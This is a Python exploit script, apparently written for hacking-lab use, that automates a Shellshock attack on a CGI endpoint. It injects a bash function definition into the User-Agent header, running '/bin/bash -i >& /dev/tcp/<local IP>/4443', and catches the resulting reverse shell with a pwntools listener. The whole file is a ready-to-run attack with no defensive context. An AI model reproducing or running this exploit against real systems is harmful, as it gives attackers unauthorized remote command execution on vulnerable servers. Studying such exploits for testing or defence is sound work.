#!/usr/bin/python
import requests
import sys
import signal
import threading
from pwn import *
import socket

# Colores
greenColour = "\033[0;32m\033[1m"
endColour = "\033[0m\033[0m"
redColour = "\033[0;31m\033[1m"
blueColour = "\033[0;34m\033[1m"
yellowColour = "\033[0;33m\033[1m"
purpleColour = "\033[0;35m\033[1m"
turquoiseColour = "\033[0;36m\033[1m"
grayColour = "\033[0;37m\033[1m"
orangeColour = "\033[0;33m\033[1m"

def saliendo(sig, frame):
    print('\n\n[+] Saliendo...\n\n')
    sys.exit(1)

# Capturar control C
signal.signal(signal.SIGINT, saliendo)

# Arte ASCII
print("""
▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
██░▄▄▄░█░████░▄▄█░██░██▄▀█▀▄█▀▄▄▀█▀▄▀█░█▀
██▄▄▄▀▀█░▄▄░█░▄▄█░██░████░███░██░█░█▀█░▄▀
██░▀▀▀░█▄██▄█▄▄▄█▄▄█▄▄█▀▄█▄▀██▄▄███▄██▄█▄
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
By B3XAL 
""")

# Solicitar la dirección IP de destino al usuario
while True:
    main_url = input("\n" + blueColour + "Ingresa la dirección IP de destino: " + endColour).strip()
    if main_url.strip():  # Verificar si se ingresó una dirección IP válida
        break

# Obtener la dirección IP local
def get_local_ip():
    try:
        # Crear un socket UDP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.1)
        
        # Conectarlo a un servidor externo (puede ser un servidor DNS)
        s.connect(("8.8.8.8", 80))
        
        # Obtener la dirección IP local
        local_ip = s.getsockname()[0]
        
        # Cerrar el socket
        s.close()
        
        return local_ip
    except Exception as e:
        print("Error al obtener la dirección IP local:", e)
        return None
    
# Obtener la dirección IP local o usar una por defecto
default_local_ip = get_local_ip() or "xXxXx"
iplocal = input(f"\n{blueColour}Ingresa la dirección IP local de conexión (Por defecto: {default_local_ip}): {endColour}").strip() or default_local_ip

print(f"{greenColour}IP local seleccionada: {iplocal}{endColour}")


# Menú para elegir el uso de proxy
print("\n" + blueColour + "Elige si deseas usar un proxy:" + endColour)
print(f"\n{purpleColour}1. Usar Proxy")
print(f"{purpleColour}2. Sin Proxy{endColour}")

use_proxy_option = input("\n" + purpleColour + "Opción: " + endColour).strip()

if use_proxy_option == '1':
    # Solicitar la dirección IP del proxy al usuario
    while True:
        proxy_ip = input(f"\n{blueColour}Ingresa la dirección IP del proxy (Por defecto: {main_url}): {endColour}").strip() or main_url

        if proxy_ip.strip():  # Verificar si se ingresó una dirección IP válida
            break

    # Solicitar el puerto del proxy al usuario
    while True:
        proxy_port = input("\n" + blueColour + "Ingresa el puerto del proxy (Por defecto: 3128): " + endColour).strip() or "3128"
        if proxy_port.isdigit():  # Verificar si se ingresó un puerto válido
            break
else:
    proxy_ip = ""
    proxy_port = ""

# Mensaje informativo
print(f"\n{blueColour}El programa se pondrá a la escucha en el puerto 4443.{endColour}")

# Puerto de escucha para la shell
lport = 4443



# Solicitar el directorio después de cgi-bin al usuario
while True:
    directory = input("\n" + blueColour + "Ingresa el directorio /cgi-bin/<dir> (Por defecto: status): " + endColour).strip() or "status"
    if directory.strip():  # Verificar si se ingresó un directorio válido
        break

proxy = {'http': f'http://{proxy_ip}:{proxy_port}'} if proxy_ip else None

# Función para ejecutar el ataque Shellshock a través de proxy o directamente
def shellshock_proxy():
   headers = { 'User-Agent' : f"() {{ :;}}; echo; echo; echo; echo; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/{iplocal}/4443 0>&1'"}

   try:
        if proxy:
            r = requests.get(f"http://{main_url}/cgi-bin/{directory}/", headers=headers, proxies=proxy)
        else:
            r = requests.get(f"http://{main_url}/cgi-bin/{directory}/", headers=headers)

   except Exception as e:
        log.error(str(e))

if __name__ == '__main__':
    try:
        threading.Thread(target=shellshock_proxy).start()
    except Exception as e:
        log.error(str(e))
    
    shell = listen(lport, timeout=20).wait_for_connection()
    
    if shell.sock is None:
        log.failure("No se pudo establecer la conexión")
        sys.exit(1)
    else:
        shell.interactive()
